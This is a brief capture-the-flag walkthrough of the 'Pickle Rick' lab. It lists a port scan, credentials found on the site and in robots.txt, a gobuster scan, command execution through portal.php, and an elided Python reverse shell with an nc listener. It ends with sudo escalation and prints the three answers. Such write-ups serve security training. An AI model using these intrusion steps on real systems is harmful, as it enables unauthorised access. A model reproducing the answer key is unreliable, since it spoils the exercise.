# Pickle Rick

## nmap
ports:

- 22 (ssh)

- 80 (http)


## website

http://$IP

=> Username=R1ckRul3s


http://$IP/robots.txt

=> Password=Wubbalubbadubdub

## gobuster
```bash
gobuster dir -u $IP -w /opt/wordlists/dirs/dsstorewordlists.txt
```

=> /login.php


### "What is the first ingredient that Rick needs?"
```bash
read file < Sup3rS3cretPickl3Ingred.txt && echo $file
```

==> **mr. meeseek hair**


### "What is the second ingredient in Rick's potion?"
```bash
read file < /home/rick/second ingredients && echo $file
```

==> **1 jerry tear**


### "What is the last and final ingredient?"
```bash
# through portal.php
python -c '...' # python reverse shell

# local machine
nc -lnvp <port>

sudo -i
cat 3rd.txt
```

==> **fleeb juice**
